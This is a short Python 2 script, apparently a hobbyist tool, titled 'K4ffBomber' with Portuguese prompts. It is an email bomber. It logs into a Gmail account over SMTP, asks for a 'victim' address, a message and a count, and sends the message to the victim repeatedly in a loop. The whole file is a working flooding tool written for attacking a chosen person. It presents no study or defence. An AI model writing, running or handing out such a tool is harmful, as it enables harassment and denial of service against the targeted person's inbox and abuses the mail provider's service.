# Nome: K4ffBomber.py
# Feito por: Davyd Maker
# Data: 22/10/2016

import smtplib as s

print "\n\n _   __  ___  __  __  ______ by: Davyd Maker _"
print "| | / / /   |/ _|/ _| | ___ \               | |"
print "| |/ / / /| | |_| |_  | |_/ / ___  _ __ ___ | |__   ___ _ __ "
print "|    \/ /_| |  _|  _| | ___ \/ _ \| '_ ` _ \| '_ \ / _ \ '__|"
print "| |\  \___  | | | |   | |_/ / (_) | | | | | | |_) |  __/ |   "
print "\_| \_/   |_/_| |_|   \____/ \___/|_| |_| |_|_.__/ \___|_| v1.0"

print "---------------------------------------------------------------"
print "Logue com sua conta do Gmail para prosseguir. Para utilizar este script e preciso ativar o acesso a aplicativos menos seguros do email que vai enviar(https://goo.gl/sLg7TS).\n"

#Login do email que vai enviar os email's
usuario = raw_input("Login: ")
senha = raw_input("Senha: ")
obj = s.SMTP("smtp.gmail.com:587")
obj.starttls()
obj.login(usuario, senha)

#Dados da vitima e do email a ser enviado
print "---------------------------------------------------------------"
vitima = raw_input("Email da vitima: ")
mensagem = raw_input("Mensagem: ")
quantidade = int(raw_input("Quantidade: "))
enviado = 0
emailMensagem = ("---------------------------------------------------------------\n\r %s \n\r---------------------------------------------------------------"
% (mensagem))

#Enviar os email(s) \o/
print "---------------------------------------------------------------"
while enviado<quantidade:
        enviado = enviado + 1
        obj.sendmail(usuario, vitima, emailMensagem)
        print "Enviando... Aperte Ctrl + C para parar"
print "---------------------------------------------------------------"
print str(enviado) + " email(s) enviados.\n"